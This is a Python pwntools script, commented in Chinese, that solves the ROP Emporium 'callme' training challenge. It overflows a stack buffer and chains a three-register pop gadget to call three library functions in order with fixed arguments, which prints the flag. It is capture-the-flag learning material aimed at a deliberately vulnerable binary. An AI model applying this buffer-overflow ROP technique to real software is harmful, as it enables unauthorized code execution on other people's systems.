#!/usr/bin/env python3
"""33 —— ROP Emporium `callme`（链式多函数调用，ret2csu 类第二题）

题目模型（实测 2024 新版二进制）
--------------------------------
* `pwnme()`：`char buf[0x20]`，`read(0, buf, 0x200)` → 溢出偏移 0x28（40 字节）。
* 二进制里没有 `callme_one/two/three` 的实现，它们在 `libcallme.so` 里（PLT 地址
  0x400720 / 0x400740 / 0x4006f0）。
* 三个函数签名相同：`fn(arg1, arg2, arg3)`，只有参数等于
  `(0xdeadbeef, 0xcafebabe, 0xd00df00d)` 时才打印 "called correctly"，
  否则打印 "Incorrect parameters" 并退出。
* 只有按 one → two → three 的顺序依次调用，`libcallme.so` 才会用
  `key1.dat` / `key2.dat` 解密 `encrypted_flag.dat` 并打印 flag
  （所以题目目录里的 3 个 .dat 是**必需**的运行时输入，删了会
  "Failed to open ..."）。

关键 gadget（`objdump -d callme` 实测，`usefulGadgets` 符号）
------------------------------------------------------------
    40093c <usefulGadgets>:
      40093c: pop rdi
      40093d: pop rsi
      40093e: pop rdx
      40093f: ret

一条 gadget 连装 3 个参数，所以每个函数调用只需
`[pop3][arg1][arg2][arg3][fn]` 五格，链长 40 + 3*5*8 = 160 字节，
远小于 `read` 的 0x200 上限。

识别特征
--------
"要连续调用多个同签名函数、每个函数都要 3 个参数" → 找一次能装多个参数的
合并 pop gadget（本题 `pop rdi; pop rsi; pop rdx`）；找不到合并 gadget 时才退回
`ret2csu`（30 那题的情形）。
"""
import os
import resource
import sys

from pwn import *  # noqa: F401,F403

context(os="linux", arch="amd64", log_level="info")

# callme_three 打印完 flag 后不再正常返回，栈已破；关掉 core，别在题目录留 core.*
resource.setrlimit(resource.RLIMIT_CORE, (0, 0))

HERE = os.path.dirname(os.path.abspath(__file__))
# 注意：callme 与 30(ret2csu) 都从 cwd 读 `encrypted_flag.dat`，两题的同名文件内容不同
# （callme: 3160bfe6… / ret2csu: 37aa4baf…），放同一目录会互相覆盖 → 30 解不出 flag。
# 所以 callme 的 5 个运行文件单独放在 callme_lab/，EXP 把 cwd 指过去
# （RUNPATH=b'.' 是相对 cwd 解析的）。
RUN_DIR = os.path.join(HERE, "callme_lab")
BIN = os.path.join(RUN_DIR, "callme")

POP_RDI_RSI_RDX = 0x40093C   # pop rdi ; pop rsi ; pop rdx ; ret（usefulGadgets）
CALLME_ONE = 0x400720
CALLME_TWO = 0x400740
CALLME_THREE = 0x4006F0
EXIT_PLT = 0x400750

OFFSET = 0x28                # buf[0x20] + saved rbp
# 2024 新版把参数改成了 64 位双写常量（objdump libcallme.so 实测的 cmp 立即数）：
#   0xdeadbeefdeadbeef / 0xcafebabecafebabe / 0xd00df00dd00df00d
# 经典 32 位版本（0xdeadbeef…）在这个二进制上会得到 "Incorrect parameters"。
ARG1, ARG2, ARG3 = 0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D


def build_chain() -> bytes:
    """buf 填充 + 三次 (pop3 + 3 参 + 函数)，顺序必须是 one → two → three。"""
    chain = b"A" * OFFSET
    for fn in (CALLME_ONE, CALLME_TWO, CALLME_THREE):
        chain += p64(POP_RDI_RSI_RDX) + p64(ARG1) + p64(ARG2) + p64(ARG3) + p64(fn)
    chain += p64(EXIT_PLT)
    return chain


def main() -> int:
    for name in ("callme", "libcallme.so", "key1.dat", "key2.dat", "encrypted_flag.dat"):
        if not os.path.exists(os.path.join(RUN_DIR, name)):
            raise SystemExit(f"[-] callme_lab/ 缺 {name}（可从 _vendor/ropemporium/callme.zip 复原）")

    payload = build_chain()
    assert b"\n" not in payload, "read 不会截断，但保持 payload 干净"
    assert len(payload) <= 0x200, f"payload {len(payload)} > 0x200 会被 read 截断"

    target = sys.argv[1] if len(sys.argv) > 1 else "LOCAL"
    if target == "LOCAL":
        io = process(BIN, cwd=RUN_DIR)
    else:
        io = remote(os.environ.get("HOST", "127.0.0.1"),
                    int(os.environ.get("PORT", "10033")))

    io.recvuntil(b"> ")
    io.send(payload)
    out = io.recvall(timeout=5)
    io.close()

    text = out.decode("latin-1")
    sys.stdout.write(text)
    if "ROPE{" in text:
        print("[+] callme OK")
        return 0
    print("[-] 没拿到 flag；检查 callme_lab/ 下的 key1.dat/key2.dat/encrypted_flag.dat")
    print("    注意 callme 的 encrypted_flag.dat（3160bfe6…）不能被 30 的（37aa4baf…）覆盖")
    return 1


if __name__ == "__main__":
    sys.exit(main())
